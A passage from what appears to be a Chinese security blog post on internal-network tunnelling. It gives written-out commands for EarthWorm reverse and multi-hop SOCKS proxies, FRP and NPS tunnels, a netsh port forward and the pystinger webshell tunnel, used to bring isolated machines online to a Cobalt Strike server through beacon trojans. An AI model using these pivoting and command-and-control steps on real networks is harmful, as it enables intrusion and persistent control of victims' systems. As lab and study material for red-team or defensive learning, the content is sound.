<p><img src="/img/image-20231101163043106.png" srcset="/img/loading.gif" lazyload alt="image-20231101163043106"></p>
<p>3、配置代理规则</p>
<p><img src="/img/image-20231101163216487.png" srcset="/img/loading.gif" lazyload alt="image-20231101163216487"></p>
<p>4、linux  使用proxychains，修改配置文件即可</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">proxychai<span class="hljs-symbol">ns4</span> firefox    即firefox走代理<br></code></pre></td></tr></table></figure>

<h3 id="2-（一级代理）反向代理"><a href="#2-（一级代理）反向代理" class="headerlink" title="2.（一级代理）反向代理"></a>2.（一级代理）反向代理</h3><p>反向连接适合于目标没有公网 IP 的情况，这时就需要一台公网 vps 了，这里就直接以内网地址作为演 示了。例如钓鱼钓到内网主机</p>
<p><img src="/img/image-20231101164919957.png" srcset="/img/loading.gif" lazyload alt="image-20231101164919957"></p>
<p>VPS执行如下</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s rcsocks -l <span class="hljs-number">1080</span> -e <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>

<p>目标器执行如下</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s rssocks -d vps -e <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>

<p>这条命令表示在本地开启 socks 5 服务，并反弹到 vps 的 4444 端口，如果代理建立成功，在 VPS 端就 会看到 rssocks cmd_socket OK! 的提示</p>
<p>在黑客的机器上使用工具连接VPS的1080端口</p>
<h4 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>1、先在VPS上开启监听</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s rcsocks -l <span class="hljs-number">1080</span> -e <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231101170117670.png" srcset="/img/loading.gif" lazyload alt="image-20231101170117670"> </p>
<p>2、然后再靶机上连接VPS</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s rssocks -d vpsIP -e <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231101170135655.png" srcset="/img/loading.gif" lazyload alt="image-20231101170135655"></p>
<p>3、在黑客电脑上使用工具连接vps的1080端口即可</p>
<h3 id="3-（二级代理）正向连接"><a href="#3-（二级代理）正向连接" class="headerlink" title="3.（二级代理）正向连接"></a>3.（二级代理）正向连接</h3><p>二级代理发生在如下的情况</p>
<p><img src="/img/image-20231101170820807.png" srcset="/img/loading.gif" lazyload alt="image-20231101170820807"></p>
<p>1、web服务器在公网黑客可以访问</p>
<p>2、B机器在内网黑客不能访问 </p>
<p>3、web服务器只能访问B机器 </p>
<p>4、B机器可以访问内网机器</p>
<p>这种情况使用二级正向代理 </p>
<p>在B主机上执行</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s ssocksd -l <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>

<p>在web服务器上执行</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_tran -l <span class="hljs-number">1080</span> -f B -g <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>

<p>黑客使用工具连接web服务器的1080端口从而实现访问内网机器</p>
<h4 id="实验步骤-2"><a href="#实验步骤-2" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>1、在内网的机器B上执行命令</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s ssocksd -l <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231101171818277.png" srcset="/img/loading.gif" lazyload alt="image-20231101171818277"> </p>
<p>2、在web机器上执行如下命令</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_tran -l <span class="hljs-number">1080</span> -f BIP -g <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231101171809205.png" srcset="/img/loading.gif" lazyload alt="image-20231101171809205"> </p>
<p>3、测试代理</p>
<p><img src="/img/image-20231101171751567.png" srcset="/img/loading.gif" lazyload alt="image-20231101171751567"> </p>
<h3 id="4-（二级代理）反向连接"><a href="#4-（二级代理）反向连接" class="headerlink" title="4.（二级代理）反向连接"></a>4.（二级代理）反向连接</h3><p>反向代理的拓扑路线如下</p>
<p><img src="/img/image-20231101172452482.png" srcset="/img/loading.gif" lazyload alt="image-20231101172452482"></p>
<p>1、web服务器在内网可以访问VPS</p>
<p>2、内网机器B在内网不能访问VPS可以访问web服务</p>
<p><img src="/img/image-20231101173124349.png" srcset="/img/loading.gif" lazyload alt="image-20231101173124349"></p>
<p>vps</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_listen -l <span class="hljs-number">1080</span> -e <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>

<p>主机B</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s ssocksd -l <span class="hljs-number">5555</span><br></code></pre></td></tr></table></figure>

<p>web服务器</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_slave -d vps_IP -e <span class="hljs-number">4444</span> -f hostB_IP -g <span class="hljs-number">5555</span><br></code></pre></td></tr></table></figure>

<p>黑客代理到vps1080端口</p>
<h2 id="FPR介绍和使用（稳定）"><a href="#FPR介绍和使用（稳定）" class="headerlink" title="FPR介绍和使用（稳定）"></a>FPR介绍和使用（稳定）</h2><h3 id="FRP介绍（0-51-2版本的使用，最新参考使用手册）"><a href="#FRP介绍（0-51-2版本的使用，最新参考使用手册）" class="headerlink" title="FRP介绍（0.51.2版本的使用，最新参考使用手册）"></a>FRP介绍（0.51.2版本的使用，最新参考使用手册）</h3><p>FRP (Fast Reverse Proxy) 是一个使用 Go 语言开发的高性能的反向代理应用，可以轻松地进行内网穿 透，对外网提供服务。FRP 支持 TCP、UDP、HTTP、HTTPS等协议类型，他支持点对点的转发，还有 全流量转发，FRP最大的一个特点是使用SOCKS代理，而SOCKS是加密通信的，类似于做了一个加密的 隧道，可以把外网的流量，通过加密隧道穿透到内网。效果有些类似于VPN。</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p>
<p>使用手册：<a target="_blank" rel="noopener" href="https://gofrp.org/zh-cn/docs/">https://gofrp.org/zh-cn/docs/</a></p>
<p>FRP分为两个文件 </p>
<p>将 frps 及 frps.ini 放到具有公网 IP 的机器上。 将 frpc 及 frpc.ini 放到处于内网环境的机器上。</p>
<h3 id="FRP启动"><a href="#FRP启动" class="headerlink" title="FRP启动"></a>FRP启动</h3><h4 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h4><p>Frp 默认给出两个服务端配置文件，一个是简版的 frps.ini，另一个是完整版本 frps_full.ini，服务端一 般就是搭建在公网的机器上（黑客的机器）</p>
<p>代理配置文件</p>
<img src="/img/image-20231102204519444.png" srcset="/img/loading.gif" lazyload alt="image-20231102204519444" style="zoom:80%;" /> 

<p>代理启动文件</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/frps -c ./</span>frps.ini<br></code></pre></td></tr></table></figure>

<p>使用FRPS 运行 frps.ini 配置文件</p>
<h4 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h4><p>FRP 默认也给出两个客户端配置文件，一个是简版的 frpc.ini，另一个是完整版本 frpc_full.ini。 这里同 样以简版的 frpc.ini 文件为例，假设 FRP 服务端所在服务器的公网 IP 为 X.X.X.X：</p>
<p>配置文件如下</p>
<img src="/img/image-20231102204551285.png" srcset="/img/loading.gif" lazyload alt="image-20231102204551285" style="zoom:80%;" />  

<p>启动文件</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/frpc -c ./</span>frpc.ini<br></code></pre></td></tr></table></figure>

<p>配置文件非常重要，需要什么功能就可以进行不同的配置，来进行代理 参考文档：</p>
<p><a target="_blank" rel="noopener" href="https://gofrp.org/zh-cn/docs/reference/">https://gofrp.org/zh-cn/docs/reference/</a></p>
<h3 id="1-点对点转发（P2P）"><a href="#1-点对点转发（P2P）" class="headerlink" title="1.点对点转发（P2P）"></a>1.点对点转发（P2P）</h3><p><img src="/img/image-20231102205549977.png" srcset="/img/loading.gif" lazyload alt="image-20231102205549977"></p>
<p>内部网络无法直接访问该端口，可以通过FRP进行端口转发到公网</p>
<p>1、服务端配置如下</p>
<p><img src="/img/image-20231102210710367.png" srcset="/img/loading.gif" lazyload alt="image-20231102210710367"> </p>
<p>启动服务端</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/frps -c ./</span>frps.ini<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231102210825854.png" srcset="/img/loading.gif" lazyload alt="image-20231102210825854"></p>
<p>2、客户端配置如下</p>
<p>连接服务端的7000端口，并将3389端口转发给服务端的6000端口</p>
<p><img src="/img/image-20231102211125334.png" srcset="/img/loading.gif" lazyload alt="image-20231102211125334"> </p>
<p>启动客户端</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">frpc.exe -<span class="hljs-keyword">c</span> frpc.ini<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231102211257942.png" srcset="/img/loading.gif" lazyload alt="image-20231102211257942"> </p>
<p><img src="/img/image-20231102211313269.png" srcset="/img/loading.gif" lazyload alt="image-20231102211313269"></p>
<p>访问vps的6000端口相当于连接内网机器的3389端口</p>
<p><img src="/img/image-20231102211421837.png" srcset="/img/loading.gif" lazyload alt="image-20231102211421837"></p>
<p><img src="/img/image-20231102211554088.png" srcset="/img/loading.gif" lazyload alt="image-20231102211554088"></p>
<h3 id="2-搭建socks代理"><a href="#2-搭建socks代理" class="headerlink" title="2.搭建socks代理"></a>2.搭建socks代理</h3><p>使用场景如下</p>
<p><img src="/img/image-20231111144301202.png" srcset="/img/loading.gif" lazyload alt="image-20231111144301202"></p>
<p>现在我们搭建socks隧道实现对目标机器的全端口访问</p>
<p>服务端 配置文件：</p>
<img src="/img/image-20231111144352990.png" srcset="/img/loading.gif" lazyload alt="image-20231111144352990" style="zoom:80%;" /> 

<p><img src="/img/image-20231111144554227.png" srcset="/img/loading.gif" lazyload alt="image-20231111144554227"></p>
<p>客户端配置文件：</p>
<img src="/img/image-20231111144230064.png" srcset="/img/loading.gif" lazyload alt="image-20231111144230064" style="zoom:80%;" />  

<p><img src="/img/image-20231111144720808.png" srcset="/img/loading.gif" lazyload alt="image-20231111144720808"></p>
<p>配置socks代理即可 </p>
<img src="/img/image-20231111145006476.png" srcset="/img/loading.gif" lazyload alt="image-20231111145006476" style="zoom:80%;" /> 

<h3 id="3-搭建socks多级隧道"><a href="#3-搭建socks多级隧道" class="headerlink" title="3.搭建socks多级隧道"></a>3.搭建socks多级隧道</h3><p>多级socks隧道搭建网络拓扑如下<img src="/img/image-20231111150408853.png" srcset="/img/loading.gif" lazyload alt="image-20231111150408853"></p>
<p>代理配置：</p>
<p><img src="/img/image-20231111151612225.png" srcset="/img/loading.gif" lazyload alt="image-20231111151612225"></p>
<p>首先搭建A-&gt;B的隧道 </p>
<p>A执行如下</p>
<img src="/img/image-20231111151630331.png" srcset="/img/loading.gif" lazyload alt="image-20231111151630331" style="zoom:67%;" /> 

<p>B执行如下</p>
<img src="/img/image-20231111151644274.png" srcset="/img/loading.gif" lazyload alt="image-20231111151644274" style="zoom:67%;" /> 

<p>搭建好隧道之后接着使用端口转发 </p>
<p>B上执行如下</p>
<img src="/img/image-20231111151704874.png" srcset="/img/loading.gif" lazyload alt="image-20231111151704874" style="zoom:67%;" /> 

<p>VPS上执行如下</p>
<p><img src="/img/image-20231111151745090.png" srcset="/img/loading.gif" lazyload alt="image-20231111151745090"> </p>
<p>通过工具连接</p>
<p><img src="/img/image-20231111151928835.png" srcset="/img/loading.gif" lazyload alt="image-20231111151928835"></p>
<h2 id="NPS的介绍和使用"><a href="#NPS的介绍和使用" class="headerlink" title="NPS的介绍和使用"></a>NPS的介绍和使用</h2><h3 id="NPS介绍"><a href="#NPS介绍" class="headerlink" title="NPS介绍"></a>NPS介绍</h3><p>nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端。</p>
<p>使用手册：<a target="_blank" rel="noopener" href="https://ehang-io.github.io/nps/#/">https://ehang-io.github.io/nps/#/</a> </p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps/releases">https://github.com/ehang-io/nps/releases</a> </p>
<p>NPS也分为客户端和服务端两个 </p>
<p>客户端：运行在内网中 </p>
<p>服务端：运行在公网上</p>
<h3 id="NPS使用"><a href="#NPS使用" class="headerlink" title="NPS使用"></a>NPS使用</h3><h4 id="服务端启用"><a href="#服务端启用" class="headerlink" title="服务端启用"></a>服务端启用</h4><p>运行nps.exe </p>
<p>账号：admin 密码：123 </p>
<p>需要 web 界面进行配置隧道</p>
<p><img src="/img/image-20231111154855788.png" srcset="/img/loading.gif" lazyload alt="image-20231111154855788"></p>
<p><img src="/img/image-20231111155023160.png" srcset="/img/loading.gif" lazyload alt="image-20231111155023160"></p>
<p><img src="/img/image-20231111155200826.png" srcset="/img/loading.gif" lazyload alt="image-20231111155200826"></p>
<p><img src="/img/image-20231111155235034.png" srcset="/img/loading.gif" lazyload alt="image-20231111155235034"></p>
<h4 id="客户端启用"><a href="#客户端启用" class="headerlink" title="客户端启用"></a>客户端启用</h4><p>在服务端的web界面进行配置后有命令显示</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">./npc.exe <span class="hljs-attribute">-server</span>=10.210.100.130:8024 <span class="hljs-attribute">-vkey</span>=1deb538o6gzkx9d7 <span class="hljs-attribute">-type</span>=tcp<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231111155543457.png" srcset="/img/loading.gif" lazyload alt="image-20231111155543457"></p>
<p>使用代理工具连接服务端的5000端口即可</p>
<p><img src="/img/image-20231111155757991.png" srcset="/img/loading.gif" lazyload alt="image-20231111155757991"></p>
<h1 id="3-上线不出网机器方式"><a href="#3-上线不出网机器方式" class="headerlink" title="3.上线不出网机器方式"></a>3.上线不出网机器方式</h1><h2 id="不出网机器拓扑介绍"><a href="#不出网机器拓扑介绍" class="headerlink" title="不出网机器拓扑介绍"></a>不出网机器拓扑介绍</h2><h3 id="不出网机器介绍"><a href="#不出网机器介绍" class="headerlink" title="不出网机器介绍"></a>不出网机器介绍</h3><p>上线不出网机器是常见的问题，如何在内网中实现不出网机器的上线呢，分为了如下的形式，常见的网络拓扑如下</p>
<p><img src="/img/image-20231111162820321.png" srcset="/img/loading.gif" lazyload alt="image-20231111162820321"></p>
<h3 id="情况分类"><a href="#情况分类" class="headerlink" title="情况分类"></a>情况分类</h3><p>上线不出网机器一般是指B区域的电脑上线到CS工具或者MSF上，因为B机器不出网无法和VPS进行通信</p>
<p>针对B区域不出网的机器一般是两种情况</p>
<p>1、纯内网环境，任何端口都不出网</p>
<p>2、只有特定的端口可以出网</p>
<p>针对A区域出网的机器也有如下的情况（中转机器或者是跳板机）</p>
<p>1、A区域的机器可以出网</p>
<p>2、A区域只有特定的端口可以出网</p>
<p>后续要用到端口复用技术和之前学习的代理技术</p>
<h2 id="CS工具自带上线不出网机器"><a href="#CS工具自带上线不出网机器" class="headerlink" title="CS工具自带上线不出网机器"></a>CS工具自带上线不出网机器</h2><p>存在一台中转机器，这台机器出网，这种是最常见的情况。经常是拿下一台边缘机器，其有多块网卡，内网机器都不出网。这种情况下拿这个边缘机器做中转，就可以上线。</p>
<p>网络拓扑图如下：</p>
<p>内网网卡：192.168.111.xxx</p>
<p>外网网卡：192.168.41.xxx</p>
<p><img src="/img/image-20231111165523183.png" srcset="/img/loading.gif" lazyload alt="image-20231111165523183"></p>
<p><strong>A区域的机器已经被控制并且上线到CS,现在要将B区域的机器进行上线，有如下的形式</strong></p>
<h3 id="1-SMB-Beacon上线CS-不出网机器"><a href="#1-SMB-Beacon上线CS-不出网机器" class="headerlink" title="1.SMB-Beacon上线CS 不出网机器"></a>1.SMB-Beacon上线CS 不出网机器</h3><p>介绍：SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons连接后，子Beacon从父Beacon获取到任务并发送。因为连接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效</p>
<p>通信网络拓扑如下：</p>
<p><img src="/img/image-20231111165629608.png" srcset="/img/loading.gif" lazyload alt="image-20231111165629608"></p>
<p>实验步骤如下：</p>
<p>1、首先控制A区域的边界主机，使用CS</p>
<p><img src="/img/image-20231111165658628.png" srcset="/img/loading.gif" lazyload alt="image-20231111165658628"></p>
<p>2、创建SMB监听器</p>
<p><img src="/img/image-20231111165712924.png" srcset="/img/loading.gif" lazyload alt="image-20231111165712924"></p>
<p>3、创建SMB类型的木马</p>
<p><img src="/img/image-20231111165730109.png" srcset="/img/loading.gif" lazyload alt="image-20231111165730109"></p>
<p>4、通过内网渗透技术（横向移动（IPC等）或者域内攻击）上传木马到B区域的机器</p>
<p><img src="/img/image-20231111165744205.png" srcset="/img/loading.gif" lazyload alt="image-20231111165744205"></p>
<p>5、运行木马之后进行连接</p>
<p>用link 命令连接它或者unlink 命令断开它</p>
<p><img src="/img/image-20231111165831213.png" srcset="/img/loading.gif" lazyload alt="image-20231111165831213"></p>
<h3 id="2-TCP-Beacon"><a href="#2-TCP-Beacon" class="headerlink" title="2. TCP Beacon"></a>2. TCP Beacon</h3><p>TCP Beacon和SMB Beacon类似只不过TCP Beacon不是使用SMB与父Beacon进行通信而是<strong>使用TCP socket</strong>进行通信，cs4.0之后，这个技术就不适合做第一个木马使用，因为他的<strong>流量都是明文的</strong>，容易被发现但是这个技术,很适合在内网穿透的时候去使用，在内网穿透的时候一般只能使用tcp beacon去生成木马。</p>
<p><img src="/img/image-20231111173322349.png" srcset="/img/loading.gif" lazyload alt="image-20231111173322349"></p>
<p>实验步骤如下</p>
<p>1、首先控制A区域的边界主机，使用CS</p>
<p><img src="/img/image-20231111173339816.png" srcset="/img/loading.gif" lazyload alt="image-20231111173339816"></p>
<p>2、创建TCP监听器</p>
<img src="/img/image-20231111173352698.png" srcset="/img/loading.gif" lazyload alt="image-20231111173352698" style="zoom:67%;" />

<p>3、创建TCP类型的木马</p>
<img src="/img/image-20231111173408727.png" srcset="/img/loading.gif" lazyload alt="image-20231111173408727" style="zoom:67%;" />

<p>4、上传木马之后进行连接 这里使用connect进行连接</p>
<p><img src="/img/image-20231111173427876.png" srcset="/img/loading.gif" lazyload alt="image-20231111173427876"></p>
<h3 id="3-HTTP代理上线"><a href="#3-HTTP代理上线" class="headerlink" title="3.HTTP代理上线"></a>3.HTTP代理上线</h3><p>CS的监听器支持HTTP代理的配置，在配置监听器的时候可以添加HTTP代理，从而实现内网上线</p>
<img src="/img/image-20231111174552095.png" srcset="/img/loading.gif" lazyload alt="image-20231111174552095" style="zoom: 67%;" />  

<p>网络的拓扑图如下：</p>
<p><img src="/img/image-20231111174645693.png" srcset="/img/loading.gif" lazyload alt="image-20231111174645693"></p>
<p>1、首先控制A区域的机器然后使用搭建HTTP隧道，HTTP隧道搭建可以使用webshell工具或者其他的工具，我们一般会借助哥斯拉或者冰蝎等webshell工具会自带该功能</p>
<p><img src="/img/image-20231111203722061.png" srcset="/img/loading.gif" lazyload alt="image-20231111203722061"></p>
<p><strong>2、这里我们使用第三方的工具Goproxy工具可以简单的开启http隧道，支持各种形式（这个工具很牛逼啥都支持）</strong></p>
<p><strong>下载地址：</strong><a target="_blank" rel="noopener" href="https://github.com/snail007/goproxy">https://github.com/snail007/goproxy</a></p>
<p>在跳板机上执行</p>
<p><img src="/img/image-20231111203912172.png" srcset="/img/loading.gif" lazyload alt="image-20231111203912172"></p>
<p>3、配置代理，因为我们是在本地进行测试，他是正向连接的代理，不能用 VPS，我们采用本地的CS</p>
<p><strong>注意这里的http proxy填写的是内网网卡的地址（在第四步做了端口转发之后）</strong></p>
<p><img src="/img/image-20231111205217099.png" srcset="/img/loading.gif" lazyload alt="image-20231111205217099"></p>
<p><strong>4、因为是双网卡，还需要做一个端口转发</strong></p>
<p>将内网网卡的8899端口转发到另一张网卡的8081端口</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenaddress</span>=192.168.111.136 <span class="hljs-attribute">listenport</span>=8899 <span class="hljs-attribute">connectaddress</span>=192.168.41.218 <span class="hljs-attribute">connectport</span>=8081<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231111205904885.png" srcset="/img/loading.gif" lazyload alt="image-20231111205904885"></p>
<p>5、运行后就可以上线</p>
<p><img src="/img/image-20231111205922028.png" srcset="/img/loading.gif" lazyload alt="image-20231111205922028"></p>
<h3 id="4-中转上线"><a href="#4-中转上线" class="headerlink" title="4.中转上线"></a>4.中转上线</h3><p>CS中自带一个中转上线的操作，就是使用端口转发的技术和socket通信</p>
<p><img src="/img/image-20231111210437649.png" srcset="/img/loading.gif" lazyload alt="image-20231111210437649"></p>
<p>1、点击这个按钮然后填写相关的内容，一般都是不变的</p>
<img src="/img/image-20231111210455707.png" srcset="/img/loading.gif" lazyload alt="image-20231111210455707" style="zoom:67%;" />

<p>2、生成木马然后正常在机器上运行就可以了</p>
<p><img src="/img/image-20231111210535696.png" srcset="/img/loading.gif" lazyload alt="image-20231111210535696"></p>
<h2 id="跳板机只有80端口出网如何上线CS"><a href="#跳板机只有80端口出网如何上线CS" class="headerlink" title="跳板机只有80端口出网如何上线CS"></a>跳板机只有80端口出网如何上线CS</h2><p>WEB机器不出网上线CS</p>
<h3 id="场景介绍"><a href="#场景介绍" class="headerlink" title="场景介绍"></a>场景介绍</h3><p>如果说当我们拿到一台电脑（一般是WEB机器）但是不出网。只有http端口可以连接，只有webshell的情况下，我们该如何将该机器上线到CS呢？</p>
<p><img src="/img/image-20231111210918853.png" srcset="/img/loading.gif" lazyload alt="image-20231111210918853"></p>
<p>这个时候就要借助80端口，然后开启socks隧道，从而进行上线</p>
<h3 id="实验前提"><a href="#实验前提" class="headerlink" title="实验前提"></a>实验前提</h3><p>当前我们控制了一个WEB主机，可以使用工具连接</p>
<img src="/img/image-20231111211434360.png" srcset="/img/loading.gif" lazyload alt="image-20231111211434360" style="zoom:67%;" /> 

<p>但是通过进一步的探测发现很多端口都不出网，被禁止了，上线CS也不行</p>
<p><img src="/img/image-20231111211459922.png" srcset="/img/loading.gif" lazyload alt="image-20231111211459922"></p>
<h3 id="实验步骤-3"><a href="#实验步骤-3" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>这个时候我们就要开启80端口的代理</p>
<p>1、我们是这里使用毒刺（pystinger）这个工具,毒刺是一款正向代理工具，通过webshell可以实现内网 socks4代理和端口映射，并且也可以直接上线MSF和CS</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/FunnyWolf/pystinger/releases/tag/v1.6">https://github.com/FunnyWolf/pystinger/releases/tag/v1.6</a></p>
<p>2、将工具中的服务端工具传到服务器中</p>
<p><img src="/img/image-20231111211602005.png" srcset="/img/loading.gif" lazyload alt="image-20231111211602005"></p>
<p>3、访问proxy页面查看一定要确保可以访问</p>
<p><img src="/img/image-20231111211616197.png" srcset="/img/loading.gif" lazyload alt="image-20231111211616197"></p>
<p>4、在服务端运行开启命令</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-literal">start</span> stinger_server.exe<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231111211635793.png" srcset="/img/loading.gif" lazyload alt="image-20231111211635793"></p>
<p>5、在VPS上运行连接命令</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">stinger_client</span>.exe -w http://<span class="hljs-number">192.168.41.218</span>/proxy.php -l <span class="hljs-number">127.0.0.1</span> -p <span class="hljs-number">60000</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231111211659252.png" srcset="/img/loading.gif" lazyload alt="image-20231111211659252"></p>
<p>6、开启CS监听器</p>
<img src="/img/image-20231111211743214.png" srcset="/img/loading.gif" lazyload alt="image-20231111211743214" style="zoom: 67%;" />

<p>7、生成木马然后运行上线CS</p>
<p><img src="/img/image-20231111211808811.png" srcset="/img/loading.gif" lazyload alt="image-20231111211808811"></p>
<p>8、查看流量都是http的流量</p>
<p><img src="/img/image-20231111211825328.png" srcset="/img/loading.gif" lazyload alt="image-20231111211825328"></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/" class="category-chain-item">内网隧道技术</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>应用层代理技术</div>
      <div>http://example.com/2023/11/27/应用层代理技术/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>r1</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年11月27日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/11/27/ICMP%E5%92%8CDNS%E9%9A%A7%E9%81%93/" title="ICMP和DNS隧道">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">ICMP和DNS隧道</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/11/27/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%A6%82%E8%BF%B0/" title="内网隧道概述">
                        <span class="hidden-mobile">内网隧道概述</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
